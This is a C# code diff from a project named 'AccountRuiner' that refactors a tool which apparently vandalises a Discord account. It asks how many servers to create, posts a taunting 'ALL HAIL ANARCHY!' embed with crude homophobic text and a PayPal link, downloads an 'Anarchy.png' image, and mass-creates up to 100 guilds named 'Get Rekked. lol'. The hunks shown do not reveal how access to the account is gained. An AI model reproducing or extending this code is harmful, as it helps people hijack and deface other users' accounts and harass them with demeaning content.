@@ -41,8 +41,7 @@ namespace AccountRuiner
         {
             
             Console.WriteLine("How Many Guilds? (Max is 100)");
-            string guilds = Console.ReadLine();
-            int intguilds = Int32.Parse(guilds);
+            int guilds = int.Parse(Console.ReadLine());
             Console.Clear();
             Console.WriteLine("Press Enter When Ready");
             Console.ReadLine();
@@ -56,9 +55,7 @@ namespace AccountRuiner
                     EmbedMaker embed = new EmbedMaker
                     {
                         Title = "ALL HAIL ANARCHY!",
-                        Description = @"I just got riggity rekked!
-I got the big gay! LOL!
-TEOTFW Best Show",
+                        Description = "I just got riggity rekked!\nI got the big gay! LOL!\nTEOTFW Best Show",
                         Color = Color.FromArgb(0, 204, 255),
                         TitleUrl = "https://paypal.me/imtoopoorlol",
                         ImageUrl = "https://cdn.discordapp.com/attachments/622851297607155722/627651954499387411/u_wot.jpg",
@@ -102,14 +99,9 @@ TEOTFW Best Show",
                 catch { }
             }
 
+            new WebClient().DownloadFile("https://cdn.discordapp.com/attachments/624408319372820500/627529053884383240/Anarchy.png", "face.png");
 
-
-            using (WebClient wc = new WebClient())
-            {
-                wc.DownloadFile("https://cdn.discordapp.com/attachments/624408319372820500/627529053884383240/Anarchy.png", "face.png");
-            }
-
-            for (int i = 1; i < intguilds + 1; i++)
+            for (int i = 1; i < guilds + 1; i++)
             {
                 client.CreateGuild("Get Rekked. lol", Image.FromFile("face.png"), "russia");
                 Console.WriteLine("Made {0} Guilds...", i);
